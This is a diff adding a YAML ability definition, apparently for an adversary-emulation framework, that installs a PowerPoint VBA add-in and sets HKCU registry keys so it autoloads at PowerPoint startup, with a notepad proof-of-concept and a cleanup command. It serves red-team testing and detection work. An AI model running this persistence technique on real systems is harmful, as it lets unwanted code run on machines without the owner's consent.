@@ -1,0 +1,29 @@
+- description: 'Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically
+    when PowerPoint is started
+
+    The sample PPA provided launches the notepad as a proof-of-concept for persistent
+    execution from Office.
+
+    '
+  id: 76ca5c1faad68251439be4f82bf61105
+  name: Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
+  platforms:
+    windows:
+      psh:
+        cleanup: $ver = (New-Object -COMObject "PowerPoint.Application").version;
+          Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"
+          -ErrorAction Ignore; Stop-Process -Name "notepad","PowerPnt" -ErrorAction
+          Ignore; Start-Sleep 3; Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction
+          Ignore
+        command: Copy "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"
+          "$env:APPDATA\Microsoft\Addins\notepad.ppam"; $ver = (New-Object -COMObject
+          "PowerPoint.Application").version; $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad";
+          New-Item -type Directory $ExcelRegPath -Force | Out-Null; New-ItemProperty
+          $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null; New-ItemProperty
+          $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null;
+          Stop-Process -Name "PowerPnt" -ErrorAction Ignore; Start-Process "PowerPnt"
+        payloads: []
+  tactic: persistence
+  technique:
+    attack_id: T1137.006
+    name: 'Office Application Startup: Add-ins'
